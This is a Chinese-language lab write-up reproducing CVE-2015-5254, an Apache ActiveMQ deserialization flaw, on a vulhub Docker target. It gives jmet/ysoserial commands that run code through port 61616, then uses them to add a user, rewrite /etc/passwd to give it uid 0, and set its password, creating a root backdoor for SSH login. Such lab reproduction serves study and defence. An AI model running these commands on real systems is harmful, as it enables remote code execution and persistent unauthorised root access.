# 序

采用网上的vulhub的漏洞环境进行复现，直接通过docker部署即可。

# 漏洞介绍

Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服
务、集群、Spring Framework等。

Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。
远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码
。

# 漏洞复现

## 环境搭建

```bash
docker-compose up -d
```

查看搭建好的docker

```bash
docker ps
```

使用浏览器直接访问activemq，查看是否部署完毕

`http://192.168.221.185:8161/admin/`

默认的用户名/密码为`admin/admin`

![1541062943217](https://github.com/littleheary/vulhub-writeup/blob/master/cve-2015-5254/assets/1541062943217.png?raw=true)

## 漏洞复现

这个漏洞靠的是攻击端口61616来实现，所以其实不需要打开web页面。

1. 构造可执行命令的序列化对象，可以通过ysoserial或jmet来实现。

   下载jmet

   ```bash
   git clone https://github.com/matthiaskaiser/jmet.git
   ```

   或者是直接下载已编译好的jar文件，我这里采用的是直接下载编译好的文件。

   ```
   wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar
   ```

   下载完成后，需要在该jar所处的文件夹中新建一个external的文件夹（否则会报文件夹不存在的错误）。

   ```bash
   cd /jmet/
   mkdir external
   ```

   jmet的原理是利用ysoserial生成payload并发送（jmet的jar中自带了ysoserial）。

   执行命令

   ```
   java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "touch /tmp/sucess" -Yp ROME 192.168.221.185 61616
   ```

   ![1541064135350](https://github.com/littleheary/vulhub-writeup/blob/master/cve-2015-5254/assets/1541064135350.png?raw=true)

   然后，我们可以去浏览器中查看这个队列的信息。

   `http://192.168.221.185:8161/admin/browse.jsp?JMSDestination=event`

   ![1541064180402](https://github.com/littleheary/vulhub-writeup/blob/master/cve-2015-5254/assets/1541064180402.png?raw=true)

   可以发现，队列信息是存在的，然后我们需要点击一下这个页面中的消息，命令方可触发。

   接下来，我们再前往漏洞系统中查看，是否真的创建成功一个文件了。

   ```bash
   docker ps
   
   root@heary-virtual-machine:/baji/vulhub/activemq/CVE-2015-5254# docker ps
   CONTAINER ID        IMAGE                    COMMAND                  CREATED             STATUS              PORTS                                              NAMES
   c5090663fb09        vulhub/activemq:5.11.1   "/bin/sh -c 'bin/act…"   5 seconds ago       Up 3 seconds        0.0.0.0:8161->8161/tcp, 0.0.0.0:61616->61616/tcp   cve20155254_activemq_1
   ```

   我们看到容器的CONTAINER ID是c5开头的。

   ```bash
   docker exec -it c5 /bin/bash
   ```

   成功进入容器的命令行以后，去查看一下刚刚创建的文件是否存在

   ```
   cd /tmp
   ls 
   ```

   ![1541064367530](https://github.com/littleheary/vulhub-writeup/blob/master/cve-2015-5254/assets/1541064367530.png?raw=true)

   可以看到，成功创建了success文件。说明反序列化命令执行成功。

   ## 创建用户

   

   根据上面的情况来看，既然可以执行命令，那么也可以创建用户，让我们试一下。

   执行jmet的命令

   ```bash
   java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "useradd -g root -s /bin/bash -u 10010 test" -Yp ROME 192.168.221.185 61616
   ```

   返回`http://192.168.221.185:8161/admin/browse.jsp?JMSDestination=event`页面，点击一下消息，触发它。

   然后，让我们再将passwd中的test的uid修改为0，使它拥有root权限

   ```bash
   java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "sed -i "s/test:x:10010/test:x:0/g" /etc/passwd" -Yp ROME 192.168.221.185 61616
   ```

   返回`http://192.168.221.185:8161/admin/browse.jsp?JMSDestination=event`页面，点击一下消息，触发它。

   接下来，让我们再为test用户设置一个密码

   ```bash
   java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "echo "test:123456" | chpasswd" -Yp ROME 192.168.221.185 61616
   ```

   返回`http://192.168.221.185:8161/admin/browse.jsp?JMSDestination=event`页面，点击一下消息，触发它。

   到此为止，一个权限为root，密码为123456的用户即创建完毕。我们可以使用ssh直接远程登陆进入操作系统，并且还是最高权限。

   